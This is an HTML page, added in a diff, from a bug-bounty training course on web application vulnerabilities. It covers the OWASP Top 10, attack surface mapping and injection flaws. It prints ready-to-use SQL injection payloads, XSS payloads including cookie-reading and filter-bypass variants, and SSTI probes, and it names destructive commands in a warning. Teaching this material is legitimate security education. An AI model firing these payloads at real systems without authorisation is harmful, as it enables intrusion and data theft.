@@ -1,0 +1,1603 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <!-- Access Control -->
+    <script src="../../../../components/AccessGuard.js"></script>
+    <script>AccessGuard.require('dark-arts');</script>
+    <!-- Progress & Achievements -->
+    <script src="../../../../components/AchievementManager.js"></script>
+    <script src="../../../../components/ModuleProgress.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Module 03: Web Application Vulnerabilities - Bug Hunting</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { min-height: 100vh; background: #0a0508; font-family: 'Georgia', 'Times New Roman', serif; color: #8a6a9a; line-height: 1.7; overflow-x: hidden; }
+        body::before { content: ''; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: radial-gradient(ellipse at 15% 40%, rgba(80, 40, 100, 0.08) 0%, transparent 50%), radial-gradient(ellipse at 85% 60%, rgba(60, 20, 80, 0.06) 0%, transparent 50%); pointer-events: none; z-index: 0; }
+        .scroll-progress { position: fixed; top: 0; left: 0; height: 3px; background: linear-gradient(90deg, #9333ea, #a855f7); z-index: 200; transition: width 0.1s linear; width: 0%; }
+        .module-header { background: rgba(10, 5, 15, 0.95); border-bottom: 1px solid rgba(100, 60, 130, 0.2); padding: 18px 40px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; backdrop-filter: blur(10px); }
+        .header-left { display: flex; align-items: center; gap: 15px; }
+        .back-btn { background: rgba(80, 40, 100, 0.2); border: 1px solid rgba(100, 60, 130, 0.3); color: #9a7aaa; padding: 7px 14px; border-radius: 4px; font-size: 0.8rem; text-decoration: none; transition: all 0.3s ease; font-family: 'Georgia', serif; }
+        .back-btn:hover { background: rgba(100, 60, 130, 0.3); border-color: rgba(147, 51, 234, 0.5); color: #c4a0d8; }
+        .module-label { font-size: 0.75rem; color: #6a4a7a; letter-spacing: 0.2em; text-transform: uppercase; }
+        .header-right { display: flex; align-items: center; gap: 12px; font-size: 0.75rem; color: #6a4a7a; }
+        .progress-bar-mini { width: 120px; height: 4px; background: rgba(60, 30, 80, 0.3); border-radius: 2px; overflow: hidden; }
+        .progress-bar-mini .fill { height: 100%; background: linear-gradient(90deg, #9333ea, #a855f7); width: 0%; transition: width 0.5s ease; }
+        .module-content { max-width: 1100px; margin: 0 auto; padding: 40px; position: relative; z-index: 10; }
+        .intro-section { text-align: center; padding: 50px 0 60px; }
+        .intro-icon { font-size: 3.5rem; margin-bottom: 20px; filter: drop-shadow(0 0 20px rgba(147, 51, 234, 0.3)); }
+        .intro-title { font-size: 2.4rem; color: #c4a0d8; margin-bottom: 12px; font-weight: 400; letter-spacing: 0.05em; }
+        .intro-meta { font-size: 0.75rem; color: #6a4a7a; letter-spacing: 0.25em; text-transform: uppercase; margin-bottom: 20px; }
+        .intro-subtitle { font-size: 1rem; color: #8a6a9a; max-width: 720px; margin: 0 auto; line-height: 1.8; }
+        .module-stats { display: flex; justify-content: center; gap: 25px; margin-top: 30px; flex-wrap: wrap; }
+        .stat-pill { padding: 8px 18px; background: rgba(60, 30, 80, 0.15); border: 1px solid rgba(100, 60, 130, 0.2); border-radius: 20px; font-size: 0.75rem; color: #7a5a8a; letter-spacing: 0.1em; }
+        .section { margin-bottom: 80px; opacity: 0; transform: translateY(30px); transition: opacity 0.6s ease, transform 0.6s ease; }
+        .section.visible { opacity: 1; transform: translateY(0); }
+        .section-number { font-size: 0.65rem; color: #6a4a7a; letter-spacing: 0.35em; text-transform: uppercase; margin-bottom: 8px; }
+        .section-title { font-size: 1.9rem; color: #c4a0d8; margin-bottom: 20px; font-weight: 400; display: flex; align-items: center; gap: 15px; border-bottom: 1px solid rgba(100, 60, 130, 0.15); padding-bottom: 15px; }
+        .section-icon { font-size: 1.6rem; opacity: 0.75; }
+        .section-body { color: #a080b0; font-size: 0.97rem; }
+        .section-body p { margin-bottom: 16px; }
+        .section-body ul { list-style: none; padding-left: 20px; margin-bottom: 16px; }
+        .section-body li { margin-bottom: 10px; position: relative; padding-left: 20px; }
+        .section-body li::before { content: '\25B8'; position: absolute; left: 0; color: #7a5a8a; }
+        .section-body h3 { color: #c4a0d8; font-size: 1.05rem; font-weight: 400; margin: 28px 0 14px; }
+        .standards-table { width: 100%; border-collapse: collapse; margin: 24px 0; font-size: 0.87rem; }
+        .standards-table th { background: rgba(40, 20, 60, 0.5); color: #c4a0d8; padding: 12px 16px; text-align: left; font-weight: normal; letter-spacing: 0.1em; font-size: 0.78rem; text-transform: uppercase; border-bottom: 1px solid rgba(100, 60, 130, 0.2); }
+        .standards-table td { padding: 12px 16px; color: #9a7aaa; border-bottom: 1px solid rgba(100, 60, 130, 0.08); vertical-align: top; }
+        .standards-table tr:hover td { background: rgba(40, 20, 60, 0.2); }
+        .standards-table .std-name { color: #c4a0d8; font-family: 'Courier New', monospace; font-size: 0.9rem; }
+        .badge { display: inline-block; padding: 2px 8px; border-radius: 10px; font-size: 0.65rem; letter-spacing: 0.08em; text-transform: uppercase; }
+        .badge-critical { background: rgba(239, 68, 68, 0.15); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.3); }
+        .badge-high { background: rgba(249, 115, 22, 0.2); color: #fb923c; border: 1px solid rgba(249, 115, 22, 0.3); }
+        .badge-medium { background: rgba(234, 179, 8, 0.15); color: #facc15; border: 1px solid rgba(234, 179, 8, 0.3); }
+        .badge-low { background: rgba(34, 197, 94, 0.15); color: #4ade80; border: 1px solid rgba(34, 197, 94, 0.3); }
+        .badge-tool { background: rgba(147, 51, 234, 0.2); color: #c084fc; border: 1px solid rgba(147, 51, 234, 0.3); }
+        .concept-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 18px; margin: 28px 0; }
+        .concept-card { background: rgba(15, 8, 20, 0.6); border: 1px solid rgba(100, 60, 130, 0.15); border-radius: 8px; padding: 22px; transition: all 0.3s ease; }
+        .concept-card:hover { transform: translateY(-4px); border-color: rgba(147, 51, 234, 0.35); box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3); }
+        .concept-card-icon { font-size: 1.8rem; margin-bottom: 12px; }
+        .concept-card-title { font-size: 1rem; color: #c4a0d8; margin-bottom: 8px; }
+        .concept-card-body { font-size: 0.85rem; color: #8a6a9a; line-height: 1.6; }
+        .concept-tag { display: inline-block; margin-top: 10px; padding: 3px 10px; background: rgba(80, 40, 100, 0.3); border-radius: 12px; font-size: 0.65rem; color: #9333ea; letter-spacing: 0.1em; text-transform: uppercase; }
+        .callout { border-radius: 8px; padding: 20px 24px; margin: 24px 0; display: flex; gap: 16px; align-items: flex-start; }
+        .callout-info { background: rgba(40, 20, 60, 0.4); border-left: 3px solid #9333ea; }
+        .callout-warning { background: rgba(60, 40, 10, 0.4); border-left: 3px solid #ca8a04; }
+        .callout-danger { background: rgba(60, 20, 20, 0.4); border-left: 3px solid #dc2626; }
+        .callout-tip { background: rgba(20, 50, 30, 0.4); border-left: 3px solid #16a34a; }
+        .callout-icon { font-size: 1.3rem; flex-shrink: 0; margin-top: 1px; }
+        .callout-title { font-size: 0.8rem; letter-spacing: 0.15em; text-transform: uppercase; margin-bottom: 6px; }
+        .callout-info .callout-title { color: #a855f7; }
+        .callout-warning .callout-title { color: #eab308; }
+        .callout-danger .callout-title { color: #ef4444; }
+        .callout-tip .callout-title { color: #22c55e; }
+        .callout-text { font-size: 0.9rem; color: #9a7aaa; line-height: 1.65; }
+        .tool-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 16px; margin: 20px 0; }
+        .tool-card { background: rgba(15, 8, 20, 0.6); border: 1px solid rgba(100, 60, 130, 0.15); border-radius: 8px; padding: 20px; transition: all 0.3s ease; }
+        .tool-card:hover { border-color: rgba(147, 51, 234, 0.3); }
+        .tool-name { font-size: 0.95rem; color: #c4a0d8; margin-bottom: 4px; font-family: 'Courier New', monospace; }
+        .tool-role { font-size: 0.68rem; color: #9333ea; letter-spacing: 0.12em; text-transform: uppercase; margin-bottom: 10px; }
+        .tool-desc { font-size: 0.84rem; color: #8a6a9a; line-height: 1.6; }
+        .code-block { background: rgba(5, 2, 10, 0.8); border: 1px solid rgba(100, 60, 130, 0.2); border-radius: 6px; padding: 16px 20px; margin: 16px 0; font-family: 'Courier New', monospace; font-size: 0.84rem; color: #b090c0; overflow-x: auto; line-height: 1.6; white-space: pre-wrap; }
+        .code-block .kw { color: #a855f7; }
+        .code-block .str { color: #86efac; }
+        .code-block .comment { color: #6a4a7a; font-style: italic; }
+        .code-block .flag { color: #fbbf24; }
+        .code-block .cmd { color: #60a5fa; }
+        .two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin: 20px 0; }
+        .col-card { background: rgba(15, 8, 20, 0.6); border: 1px solid rgba(100, 60, 130, 0.15); border-radius: 8px; padding: 22px; }
+        .col-card h3 { font-size: 1rem; color: #c4a0d8; margin-bottom: 12px; display: flex; align-items: center; gap: 8px; }
+        .col-card ul { list-style: none; padding: 0; }
+        .col-card li { font-size: 0.88rem; color: #8a6a9a; padding: 6px 0; border-bottom: 1px solid rgba(100, 60, 130, 0.08); display: flex; align-items: flex-start; gap: 8px; }
+        .col-card li:last-child { border-bottom: none; }
+        .li-marker { color: #9333ea; flex-shrink: 0; }
+        .numbered-list { list-style: none; padding-left: 0; margin-bottom: 16px; counter-reset: step-counter; }
+        .numbered-list li { counter-increment: step-counter; position: relative; padding-left: 40px; margin-bottom: 14px; }
+        .numbered-list li::before { content: counter(step-counter, decimal-leading-zero); position: absolute; left: 0; color: #9333ea; font-family: 'Courier New', monospace; font-size: 0.85rem; font-weight: bold; }
+        .discussion-section { background: linear-gradient(135deg, rgba(40, 20, 60, 0.3), rgba(30, 15, 50, 0.4)); border: 1px solid rgba(100, 60, 130, 0.25); border-radius: 10px; padding: 30px; margin: 40px 0; }
+        .discussion-title { font-size: 1.1rem; color: #c4a0d8; margin-bottom: 20px; display: flex; align-items: center; gap: 10px; }
+        .prompt-list { list-style: none; padding: 0; }
+        .prompt-item { padding: 14px 18px; background: rgba(15, 8, 20, 0.5); border: 1px solid rgba(100, 60, 130, 0.12); border-radius: 6px; margin-bottom: 10px; font-size: 0.9rem; color: #9a7aaa; line-height: 1.6; display: flex; gap: 12px; }
+        .prompt-num { color: #9333ea; font-size: 0.8rem; font-family: 'Courier New', monospace; flex-shrink: 0; padding-top: 2px; }
+        .takeaway-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 16px; margin: 24px 0; }
+        .takeaway-card { background: rgba(15, 8, 20, 0.6); border: 1px solid rgba(100, 60, 130, 0.15); border-radius: 8px; padding: 20px; text-align: center; }
+        .takeaway-icon { font-size: 2rem; margin-bottom: 10px; }
+        .takeaway-title { font-size: 0.85rem; color: #c4a0d8; margin-bottom: 6px; }
+        .takeaway-desc { font-size: 0.78rem; color: #7a5a8a; line-height: 1.5; }
+        .completion-section { text-align: center; padding: 60px 40px; background: linear-gradient(135deg, rgba(40, 20, 60, 0.3), rgba(30, 15, 50, 0.4)); border: 1px solid rgba(100, 60, 130, 0.3); border-radius: 12px; margin: 60px 0 40px; }
+        .completion-icon { font-size: 3.5rem; margin-bottom: 20px; }
+        .completion-title { font-size: 1.8rem; color: #c4a0d8; margin-bottom: 12px; font-weight: 400; }
+        .completion-text { color: #8a6a9a; font-size: 0.95rem; max-width: 560px; margin: 0 auto 30px; line-height: 1.8; }
+        .completion-btn { display: inline-flex; align-items: center; gap: 10px; padding: 14px 36px; background: linear-gradient(135deg, #7c3aed, #9333ea); border: none; border-radius: 8px; color: #f3e8ff; font-size: 1rem; cursor: pointer; font-family: 'Georgia', serif; letter-spacing: 0.05em; transition: all 0.3s ease; box-shadow: 0 4px 20px rgba(147, 51, 234, 0.3); }
+        .completion-btn:hover { background: linear-gradient(135deg, #6d28d9, #7c3aed); box-shadow: 0 6px 30px rgba(147, 51, 234, 0.45); transform: translateY(-2px); }
+        @media (max-width: 768px) { .module-header { padding: 15px 20px; } .module-content { padding: 20px; } .two-col { grid-template-columns: 1fr; } .concept-grid { grid-template-columns: 1fr; } .tool-grid { grid-template-columns: 1fr; } .intro-title { font-size: 1.8rem; } .section-title { font-size: 1.5rem; } }
+    </style>
+</head>
+<body>
+
+<div class="scroll-progress" id="scrollProgress"></div>
+
+<header class="module-header">
+    <div class="header-left">
+        <a href="../index.html" class="back-btn">&#8592; Back to Course</a>
+        <div>
+            <div class="module-label">BH // Bug Hunting &middot; Module 03</div>
+        </div>
+    </div>
+    <div class="header-right">
+        <span>Reading Progress</span>
+        <div class="progress-bar-mini">
+            <div class="fill" id="readingFill"></div>
+        </div>
+    </div>
+</header>
+
+<main class="module-content">
+
+    <!-- Hero -->
+    <div class="intro-section">
+        <div class="intro-icon">&#127760;</div>
+        <h1 class="intro-title">Web Application Vulnerabilities</h1>
+        <div class="intro-meta">Bug Hunting &bull; Module 03 &bull; Web Vulns</div>
+        <p class="intro-subtitle">
+            Web applications are the largest and most rewarding attack surface in modern bug bounty
+            programs. From injection flaws to broken access controls, the OWASP Top 10 provides the
+            taxonomy and the methodology. This module covers the vulnerability classes you will encounter
+            most frequently, the tools used to discover them, and the decision-making process that
+            separates a productive hunter from one who spends hours on dead ends. Every section maps
+            directly to real-world bounty categories and payout tiers.
+        </p>
+        <div class="module-stats">
+            <div class="stat-pill">OWASP Top 10</div>
+            <div class="stat-pill">Injection</div>
+            <div class="stat-pill">Access Control</div>
+            <div class="stat-pill">Content Discovery</div>
+            <div class="stat-pill">~25 min read</div>
+        </div>
+    </div>
+
+    <!-- Section 1: The OWASP Top 10 (2021) -->
+    <div class="section" id="s1">
+        <div class="section-number">Section 01</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128220;</span>
+            The OWASP Top 10 (2021)
+        </h2>
+        <div class="section-body">
+            <p>
+                The Open Web Application Security Project (OWASP) is a nonprofit foundation that produces
+                freely available resources for web application security. Their flagship deliverable is the
+                OWASP Top 10 &mdash; a consensus-driven ranking of the most critical security risks to web
+                applications, updated approximately every three to four years based on data collected from
+                hundreds of organizations and thousands of real-world applications. The current version,
+                published in 2021, reflects vulnerability data from over 500,000 applications.
+            </p>
+            <p>
+                The Top 10 is not an exhaustive taxonomy &mdash; it is a prioritization framework and the
+                shared vocabulary between you, the program, and the triage team. When a program says "we
+                follow OWASP guidelines," they are telling you which vulnerability classes they consider
+                in-scope and which severity tiers they use for triage.
+            </p>
+
+            <table class="standards-table">
+                <thead>
+                    <tr>
+                        <th>Category</th>
+                        <th>Name</th>
+                        <th>Severity</th>
+                        <th>Description</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td class="std-name">A01</td>
+                        <td>Broken Access Control</td>
+                        <td><span class="badge badge-critical">Critical</span></td>
+                        <td>Users act outside intended permissions: IDOR, privilege escalation, missing function-level access controls, CORS misconfigurations. Moved from #5 to #1 in 2021.</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">A02</td>
+                        <td>Cryptographic Failures</td>
+                        <td><span class="badge badge-high">High</span></td>
+                        <td>Formerly "Sensitive Data Exposure." Cleartext transmission, weak algorithms, improper key management, missing encryption at rest, hardcoded secrets.</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">A03</td>
+                        <td>Injection</td>
+                        <td><span class="badge badge-critical">Critical</span></td>
+                        <td>Untrusted data sent to an interpreter: SQLi, NoSQL injection, OS command injection, LDAP injection, XSS. Dropped from #1 to #3 as frameworks improved default protections.</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">A04</td>
+                        <td>Insecure Design</td>
+                        <td><span class="badge badge-high">High</span></td>
+                        <td>New in 2021. Design and architecture flaws: missing threat modeling, insecure business logic, no rate limiting. Cannot be fixed by patching code alone.</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">A05</td>
+                        <td>Security Misconfiguration</td>
+                        <td><span class="badge badge-medium">Medium</span></td>
+                        <td>Default credentials, verbose error messages, overly permissive CORS, missing security headers, directory listing, exposed admin interfaces.</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">A06</td>
+                        <td>Vulnerable Components</td>
+                        <td><span class="badge badge-high">High</span></td>
+                        <td>Libraries, frameworks, or software with known CVEs. Server-side and client-side. Includes unmaintained or end-of-life software.</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">A07</td>
+                        <td>Authentication Failures</td>
+                        <td><span class="badge badge-high">High</span></td>
+                        <td>Weak passwords, credential stuffing, missing MFA, session fixation, predictable tokens, improper session invalidation.</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">A08</td>
+                        <td>Integrity Failures</td>
+                        <td><span class="badge badge-high">High</span></td>
+                        <td>New in 2021. Insecure CI/CD, auto-update without signature verification, deserialization of untrusted data, unsigned packages.</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">A09</td>
+                        <td>Logging &amp; Monitoring Failures</td>
+                        <td><span class="badge badge-medium">Medium</span></td>
+                        <td>Insufficient logging, missing alerting, unprotected logs. Breaches go undetected for months. Hard to test externally.</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">A10</td>
+                        <td>SSRF</td>
+                        <td><span class="badge badge-critical">Critical</span></td>
+                        <td>New in 2021. Application fetches resources based on user input without validating destination. Access internal services, cloud metadata (169.254.169.254).</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>How OWASP Maps to Bug Bounty Priorities</h3>
+
+            <p>
+                Not every OWASP category translates equally to bounty payouts. A01 (Broken Access Control)
+                and A03 (Injection) consistently produce the highest-paid reports because they directly
+                demonstrate data access or system compromise. A05 (Security Misconfiguration) findings are
+                common but often triaged as informational unless you demonstrate concrete impact. A10
+                (SSRF) has seen a dramatic payout increase since 2020 due to cloud infrastructure &mdash;
+                an SSRF that reads AWS metadata credentials is critical on any program.
+            </p>
+
+            <div class="callout callout-info">
+                <span class="callout-icon">&#8505;</span>
+                <div class="callout-content">
+                    <div class="callout-title">The 2021 Restructuring</div>
+                    <div class="callout-text">
+                        The 2021 update merged several former categories and introduced three new ones (A04
+                        Insecure Design, A08 Software and Data Integrity Failures, A10 SSRF). XSS was absorbed
+                        into the broader A03 Injection category. This restructuring reflects a shift in the
+                        threat landscape: design-level flaws and supply chain attacks are now recognized as
+                        equally dangerous to traditional implementation bugs.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 2: Attack Surface Mapping -->
+    <div class="section" id="s2">
+        <div class="section-number">Section 02</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128506;</span>
+            Attack Surface Mapping
+        </h2>
+        <div class="section-body">
+            <p>
+                The attack surface of a web application is the total set of points where an unauthorized
+                user can attempt to enter data or extract data from the system. Before testing any specific
+                vulnerability, you need a comprehensive map of the application's attack surface. Skipping
+                this step is the single most common mistake new bug hunters make &mdash; they jump directly
+                to testing login forms for SQLi while ignoring the undocumented API endpoint that accepts
+                arbitrary file uploads with no authentication.
+            </p>
+
+            <h3>Identifying Entry Points</h3>
+
+            <p>
+                An attack surface includes every mechanism through which data enters or leaves the
+                application: HTML forms, URL parameters, HTTP headers, cookies, WebSocket connections,
+                file upload handlers, API endpoints, RSS/XML feeds, GraphQL queries, and error messages
+                that leak internal state. Each entry point is a potential vector for one or more
+                vulnerability classes.
+            </p>
+
+            <div class="concept-grid">
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128221;</div>
+                    <div class="concept-card-title">Forms and Input Fields</div>
+                    <div class="concept-card-body">
+                        Every form field is a potential injection point: search bars, contact forms, profile
+                        editors, file upload fields. Pay attention to fields that display user input back
+                        to the page (reflected) or store it for later display (stored).
+                    </div>
+                    <span class="concept-tag">Input Vector</span>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128279;</div>
+                    <div class="concept-card-title">API Endpoints</div>
+                    <div class="concept-card-body">
+                        REST APIs, GraphQL, and SOAP services often have weaker validation than frontends.
+                        Find undocumented endpoints by examining JavaScript source, mobile app traffic, and
+                        API versioning patterns (/api/v1/ vs /api/v2/).
+                    </div>
+                    <span class="concept-tag">API Surface</span>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128228;</div>
+                    <div class="concept-card-title">File Uploads</div>
+                    <div class="concept-card-body">
+                        High-value targets. Test for unrestricted file types (.php, .jsp), missing
+                        content-type validation, path traversal in filenames, and stored XSS via SVG or
+                        HTML uploads.
+                    </div>
+                    <span class="concept-tag">File Handling</span>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128268;</div>
+                    <div class="concept-card-title">WebSockets</div>
+                    <div class="concept-card-body">
+                        WebSocket connections bypass traditional HTTP security controls. Many WAFs do not
+                        inspect them. Test for missing auth on upgrade, injection via messages, and
+                        cross-site WebSocket hijacking (CSWSH).
+                    </div>
+                    <span class="concept-tag">Real-time</span>
+                </div>
+            </div>
+
+            <h3>Authentication Boundaries and Privilege Levels</h3>
+
+            <p>
+                Map every authentication state: unauthenticated, standard user, premium user, moderator,
+                admin, and API key tiers. Document which endpoints are accessible and which actions are
+                permitted for each. The gaps between what should be restricted and what actually is
+                restricted are where access control vulnerabilities live.
+            </p>
+
+            <h3>Spider and Crawler Tools</h3>
+
+            <p>
+                Create at least two accounts at different privilege levels. Capture the full set of
+                requests available to a high-privilege account, then replay those requests using the
+                session token of a low-privilege account. Many bounty hunters maintain separate browser
+                profiles &mdash; one as admin, one as a regular user, one unauthenticated &mdash; and
+                systematically test every privileged action from the lower-privilege session.
+            </p>
+
+            <div class="two-col">
+                <div class="col-card">
+                    <h3>&#128375; Burp Spider</h3>
+                    <ul>
+                        <li><span class="li-marker">&#9654;</span>Integrated into Burp Suite proxy workflow</li>
+                        <li><span class="li-marker">&#9654;</span>Follows links, submits forms, discovers hidden content</li>
+                        <li><span class="li-marker">&#9654;</span>Respects scope configuration to avoid off-target crawling</li>
+                        <li><span class="li-marker">&#9654;</span>Passive spider runs alongside manual browsing</li>
+                        <li><span class="li-marker">&#9654;</span>Active spider autonomously explores the application</li>
+                    </ul>
+                </div>
+                <div class="col-card">
+                    <h3>&#128375; OWASP ZAP Spider</h3>
+                    <ul>
+                        <li><span class="li-marker">&#9654;</span>Free, open-source alternative to Burp Spider</li>
+                        <li><span class="li-marker">&#9654;</span>Traditional spider + AJAX spider for JavaScript-heavy apps</li>
+                        <li><span class="li-marker">&#9654;</span>API-driven &mdash; scriptable for CI/CD integration</li>
+                        <li><span class="li-marker">&#9654;</span>Supports authenticated crawling with session management</li>
+                        <li><span class="li-marker">&#9654;</span>Generates site tree for visual attack surface review</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="callout callout-info">
+                <span class="callout-icon">&#8505;</span>
+                <div class="callout-content">
+                    <div class="callout-title">Attack Surface Checklist</div>
+                    <div class="callout-text">
+                        Before testing a single vulnerability, document: all subdomains and virtual hosts,
+                        all API endpoints (REST, GraphQL, WebSocket), every form and input field, all file
+                        upload handlers, authentication mechanisms and session management, user roles and
+                        permission boundaries, third-party integrations and OAuth flows, and any
+                        JavaScript-heavy client-side logic that makes API calls. This inventory is your
+                        testing roadmap.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 3: Injection Vulnerabilities -->
+    <div class="section" id="s3">
+        <div class="section-number">Section 03</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128163;</span>
+            Injection Vulnerabilities
+        </h2>
+        <div class="section-body">
+            <p>
+                Injection vulnerabilities occur when untrusted data is sent to an interpreter as part of a
+                command or query. Despite decades of awareness, injection remains one of the most impactful
+                vulnerability classes &mdash; it can lead to complete database compromise, remote code
+                execution, or full server takeover.
+            </p>
+
+            <h3>SQL Injection (SQLi)</h3>
+
+            <p>
+                SQL injection occurs when user input is concatenated directly into SQL queries without
+                parameterization. The attacker manipulates query logic to extract data, bypass authentication,
+                or execute OS commands via database functions like
+                <code style="color: #c084fc;">xp_cmdshell</code> (MSSQL) or
+                <code style="color: #c084fc;">LOAD_FILE()</code> (MySQL).
+            </p>
+
+            <ul>
+                <li><strong style="color: #c4a0d8;">Union-based SQLi</strong> &mdash; Uses UNION SELECT to extract data from other tables. Requires matching column count. Fastest when output is visible.</li>
+                <li><strong style="color: #c4a0d8;">Blind SQLi (Boolean-based)</strong> &mdash; Infers data by observing behavioral differences (true vs false responses). Works when output is suppressed.</li>
+                <li><strong style="color: #c4a0d8;">Time-based Blind SQLi</strong> &mdash; Uses delay functions (SLEEP, WAITFOR DELAY, pg_sleep). 5-second response = true; instant = false. Slowest but most universal.</li>
+            </ul>
+
+            <div class="code-block">
+<span class="comment"># SQL Injection test payloads</span>
+<span class="comment"># Start with these in any input field, URL parameter, or header value</span>
+
+<span class="comment"># Basic detection</span>
+<span class="str">'</span>                             <span class="comment"># Single quote — does the app error?</span>
+<span class="str">1' OR '1'='1' --</span>              <span class="comment"># Boolean true injection</span>
+<span class="str">1" OR "1"="1</span>                  <span class="comment"># Double-quote variant</span>
+
+<span class="comment"># Union-based: determine column count, then extract</span>
+<span class="str">' ORDER BY 5 --</span>               <span class="comment"># Find column count (increment until error)</span>
+<span class="str">' UNION SELECT NULL,NULL,NULL --</span>
+<span class="str">' UNION SELECT 1,2,3 --</span>
+
+<span class="comment"># Time-based blind: universal detection</span>
+<span class="str">1' AND SLEEP(5) --</span>            <span class="comment"># MySQL</span>
+<span class="str">1'; WAITFOR DELAY '0:0:5' --</span>  <span class="comment"># MSSQL</span>
+<span class="str">1'; SELECT pg_sleep(5) --</span>     <span class="comment"># PostgreSQL</span>
+
+<span class="comment"># Authentication bypass</span>
+<span class="str">admin' --</span>
+<span class="str">' OR 1=1 LIMIT 1 --</span>
+            </div>
+
+            <h3>Cross-Site Scripting (XSS)</h3>
+
+            <p>
+                XSS occurs when an application includes untrusted data in a web page without proper
+                escaping. The attacker injects client-side scripts that execute in the victim's browser,
+                enabling session hijacking, credential theft, or redirection to malicious sites.
+            </p>
+
+            <ul>
+                <li><strong style="color: #c4a0d8;">Reflected XSS</strong> &mdash; Reflected off the server in error messages, search results, or URL parameters. Requires victim to click a crafted link.</li>
+                <li><strong style="color: #c4a0d8;">Stored XSS</strong> &mdash; Permanently stored (database, comment field, profile). Every viewer executes the script. Higher impact, no victim interaction needed.</li>
+                <li><strong style="color: #c4a0d8;">DOM-based XSS</strong> &mdash; Vulnerability in client-side JavaScript. Payload never reaches the server. Common in SPAs using innerHTML or eval() with document.location or window.name.</li>
+            </ul>
+
+            <div class="code-block">
+<span class="comment"># XSS test payloads — start simple, escalate complexity</span>
+
+<span class="comment"># Basic detection</span>
+<span class="str">&lt;script&gt;alert(1)&lt;/script&gt;</span>
+<span class="str">&lt;img src=x onerror=alert(1)&gt;</span>
+<span class="str">&lt;svg onload=alert(1)&gt;</span>
+
+<span class="comment"># Filter bypass variants</span>
+<span class="str">&lt;img src=x onerror=alert`1`&gt;</span>
+<span class="str">&lt;details open ontoggle=alert(1)&gt;</span>
+<span class="str">"&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</span>
+<span class="str">'&gt;&lt;img src=x onerror=alert(document.cookie)&gt;</span>
+
+<span class="comment"># DOM-based: test URL fragments and query parameters</span>
+<span class="str">javascript:alert(1)</span>
+
+<span class="comment"># Polyglot: tests multiple contexts simultaneously</span>
+<span class="str">jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e</span>
+            </div>
+
+            <h3>Command Injection and SSTI</h3>
+
+            <p>
+                Command injection occurs when user-supplied data is passed to a system shell without
+                sanitization &mdash; common in applications that perform DNS lookups, ping tests, file
+                conversions, or PDF generation. Server-Side Template Injection (SSTI) occurs when input
+                is embedded into a template engine (Jinja2, Twig, Freemarker) and processed as code. Test
+                for SSTI by injecting <code style="color: #c084fc;">{{7*7}}</code> or
+                <code style="color: #c084fc;">${7*7}</code> &mdash; if the response contains
+                <code style="color: #c084fc;">49</code>, the template engine is evaluating your input.
+                Both can lead to remote code execution.
+            </p>
+
+            <h3>Where Injections Hide</h3>
+
+            <p>
+                The obvious places &mdash; login forms, search bars &mdash; are usually the most hardened.
+                The highest-value injection points are the ones developers forget about:
+            </p>
+
+            <ul>
+                <li><strong style="color: #c4a0d8;">URL parameters</strong> &mdash; Sort order, pagination, filtering, callback functions</li>
+                <li><strong style="color: #c4a0d8;">HTTP headers</strong> &mdash; User-Agent, Referer, X-Forwarded-For often processed server-side without sanitization</li>
+                <li><strong style="color: #c4a0d8;">Cookie values</strong> &mdash; Custom parameters beyond the session ID used in server-side logic</li>
+                <li><strong style="color: #c4a0d8;">JSON/XML body</strong> &mdash; API endpoints may parse nested values into queries</li>
+                <li><strong style="color: #c4a0d8;">File names</strong> &mdash; Upload handlers processing filenames, EXIF data, or document metadata</li>
+                <li><strong style="color: #c4a0d8;">Hidden form fields</strong> &mdash; Prices, role IDs, and internal IDs developers assume users cannot modify</li>
+            </ul>
+
+            <div class="callout callout-warning">
+                <span class="callout-icon">&#9888;</span>
+                <div class="callout-content">
+                    <div class="callout-title">Test Responsibly</div>
+                    <div class="callout-text">
+                        Never use destructive payloads (DROP TABLE, rm -rf, format) even in testing. Use
+                        detection payloads that demonstrate the vulnerability without causing damage: SLEEP()
+                        for time-based SQLi, alert(document.domain) for XSS, id or whoami for command injection.
+                        A well-crafted proof of concept demonstrates impact without risking the target system.
+                        Destructive payloads can get you permanently banned from a program or face legal action.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 4: Broken Access Control -->
+    <div class="section" id="s4">
+        <div class="section-number">Section 04</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128274;</span>
